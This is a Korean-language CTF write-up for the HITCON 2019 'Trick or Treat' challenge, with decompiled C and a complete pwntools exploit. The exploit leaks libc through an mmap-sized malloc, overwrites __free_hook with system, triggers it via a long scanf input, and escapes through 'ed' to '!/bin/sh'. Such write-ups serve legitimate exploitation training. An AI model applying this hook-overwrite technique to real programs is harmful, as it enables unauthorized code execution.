---
title: "2019 HITCON CTF 🎃 Trick or Treat 🎃"
date: 2020-4-16
ctf: HITCON CTF
layout: post
published : false
---

* malloc -> mmap -> libc base leak
* Free_hook -> system
* scanf call malloc & free

원하는 사이즈만큼 malloc에 인자로 할당할 수 있고 할당을 성공하면 chunk address를 leak이 된다. malloc을 할 때 top chunk 사이즈보다 크게 할당하게 되면 mmap으로 새로운 영역에 매핑해서 할당하게된다. 이를 이용해서 libc base 거리가 일정해서 libc base를 구할 수 있게된다. 이게 trick인 이유가 scanf에 값을 많이 넣게 되면 scanf 내부에서 malloc과 free를 호출해서 임시 버퍼를 만든다. hook을 덮어서 system("ed")을 만들어서 ed로 escape할 수 있다. 그리고 !/bin/sh를 입력하면 쉘 따게 된다. 

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  signed int i; // [rsp+4h] [rbp-2Ch]
  __int128 size; // [rsp+8h] [rbp-28h]
  __int64 v5; // [rsp+18h] [rbp-18h]
  _QWORD *v6; // [rsp+20h] [rbp-10h]
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  size = 0uLL;
  v5 = 0LL;
  v6 = 0LL;
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  write(1, "Size:", 5uLL);
  __isoc99_scanf("%lu", &size);
  v6 = malloc(size);
  if ( v6 )
  {
    printf("Magic:%p\n", v6);
    for ( i = 0; i <= 1; ++i )
    {
      write(1, "Offset & Value:", 0x10uLL);
      __isoc99_scanf("%lx %lx", &size + 8);
      v6[*(&size + 1)] = v5;
    }
  }
  _exit(0);
}
```

> exploit.py

```python
from pwn import *

e = ELF('./trick_or_treat')
p = process('./trick_or_treat')
libc = e.libc

p.sendlineafter('Size:','99999999') # mmap to libc leak
p.recvuntil(':')
leak = int(p.recvline().strip(),16) # chunk address
log.info(hex(leak))
libc_base = leak + 100003824
log.info(hex(libc_base))
free_hook = libc_base + libc.symbols['__free_hook']
log.info(hex(free_hook))
system = libc_base + libc.symbols['system']
log.info(hex(system))
free_hook_offset = (free_hook - leak) / 8
log.info(hex(free_hook_offset))

p.sendlineafter('Offset & Value:',hex(free_hook_offset) + ' ' + hex(system))
p.sendlineafter('Offset & Value:','A'*10000) # scanf call malloc -> free

p.sendline('ed')

p.sendline('!/bin/sh')

p.interactive()
```

